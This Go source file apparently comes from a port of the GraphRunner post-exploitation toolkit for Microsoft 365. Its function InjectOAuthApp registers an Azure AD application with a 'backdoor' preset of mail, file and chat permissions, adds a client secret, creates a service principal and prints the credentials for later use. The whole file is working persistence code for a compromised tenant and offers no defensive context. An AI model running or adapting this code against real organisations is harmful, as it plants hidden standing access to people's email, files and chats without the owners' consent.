package persist

import (
	"context"
	"encoding/json"
	"fmt"

	"github.com/graphrunner/internal/graph"
	"github.com/graphrunner/internal/output"
)

// Permission scope presets matching GraphRunner's built-in presets.
var scopePresets = map[string][]map[string]interface{}{
	"backdoor": {
		// Mail.Read, Mail.Send, Files.ReadWrite.All, Chat.Read, User.Read
		{"id": "570282fd-fa5c-430d-a7fd-fc8dc98a9dca", "type": "Scope"}, // Mail.Read
		{"id": "e383f46e-2787-4529-855e-0e479a3ffac0", "type": "Scope"}, // Mail.Send
		{"id": "863451e7-0667-486c-a5d6-d135439485f0", "type": "Scope"}, // Files.ReadWrite.All
		{"id": "f501c180-9344-439a-bca0-6cbf209fd270", "type": "Scope"}, // Chat.Read
		{"id": "e1fe6dd8-ba31-4d61-89e7-88639da4683d", "type": "Scope"}, // User.Read
	},
	"mail-reader": {
		{"id": "570282fd-fa5c-430d-a7fd-fc8dc98a9dca", "type": "Scope"}, // Mail.Read
		{"id": "e1fe6dd8-ba31-4d61-89e7-88639da4683d", "type": "Scope"}, // User.Read
	},
	"files-reader": {
		{"id": "10465720-29dd-4523-a11a-6a75c743c9d9", "type": "Scope"}, // Files.Read
		{"id": "e1fe6dd8-ba31-4d61-89e7-88639da4683d", "type": "Scope"}, // User.Read
	},
}

// InjectResult holds the result of an OAuth app injection.
type InjectResult struct {
	AppID       string `json:"app_id"`
	ObjectID    string `json:"object_id"`
	DisplayName string `json:"display_name"`
	Secret      string `json:"client_secret"`
	SPID        string `json:"service_principal_id"`
	Preset      string `json:"preset"`
}

// InjectOAuthApp creates a backdoor app registration with the given permission preset.
func InjectOAuthApp(ctx context.Context, client *graph.Client, appName, preset string) (*InjectResult, error) {
	scopes, ok := scopePresets[preset]
	if !ok {
		return nil, fmt.Errorf("unknown preset %q — available: backdoor, mail-reader, files-reader", preset)
	}

	// Microsoft Graph resource app ID
	graphResourceAppID := "00000003-0000-0000-c000-000000000000"

	// Step 1: Create app registration
	appPayload := map[string]interface{}{
		"displayName": appName,
		"signInAudience": "AzureADMyOrg",
		"requiredResourceAccess": []map[string]interface{}{
			{
				"resourceAppId":  graphResourceAppID,
				"resourceAccess": scopes,
			},
		},
		"web": map[string]interface{}{
			"redirectUris": []string{"https://login.microsoftonline.com/common/oauth2/nativeclient"},
		},
	}

	output.Info("Creating app registration: %s (preset: %s)", appName, preset)
	appResp, err := client.Post(ctx, graph.EndpointApplications, appPayload)
	if err != nil {
		return nil, fmt.Errorf("create application: %w", err)
	}

	var appData map[string]interface{}
	if err := json.Unmarshal(appResp, &appData); err != nil {
		return nil, fmt.Errorf("parse application response: %w", err)
	}

	objectID, _ := appData["id"].(string)
	appID, _ := appData["appId"].(string)
	if objectID == "" || appID == "" {
		return nil, fmt.Errorf("application creation response missing id/appId: %s", appResp)
	}

	// Step 2: Add password credential
	output.Info("Adding password credential...")
	pwdPayload := map[string]interface{}{
		"passwordCredential": map[string]interface{}{
			"displayName": "GraphRunner",
		},
	}
	endpoint := fmt.Sprintf(graph.EndpointAppAddPassword, objectID)
	pwdResp, err := client.Post(ctx, endpoint, pwdPayload)
	if err != nil {
		return nil, fmt.Errorf("add password: %w", err)
	}

	var pwdData map[string]interface{}
	if err := json.Unmarshal(pwdResp, &pwdData); err != nil {
		return nil, fmt.Errorf("parse password credential response: %w", err)
	}
	secret, _ := pwdData["secretText"].(string)

	// Step 3: Create service principal
	output.Info("Creating service principal...")
	spPayload := map[string]interface{}{
		"appId": appID,
	}
	spResp, err := client.Post(ctx, graph.EndpointServicePrincs, spPayload)
	if err != nil {
		output.Warn("Service principal creation: %v", err)
	}

	var spData map[string]interface{}
	if spResp != nil {
		if err := json.Unmarshal(spResp, &spData); err != nil {
			output.Warn("Parse service principal response: %v", err)
		}
	}
	spID, _ := spData["id"].(string)

	result := &InjectResult{
		AppID:       appID,
		ObjectID:    objectID,
		DisplayName: appName,
		Secret:      secret,
		SPID:        spID,
		Preset:      preset,
	}

	output.Success("OAuth app injected successfully!")
	output.Info("  App ID:          %s", appID)
	output.Info("  Object ID:       %s", objectID)
	output.Info("  Client Secret:   %s", secret)
	output.Info("  SP ID:           %s", spID)
	output.Warn("Save these credentials — the secret won't be shown again!")

	return result, nil
}
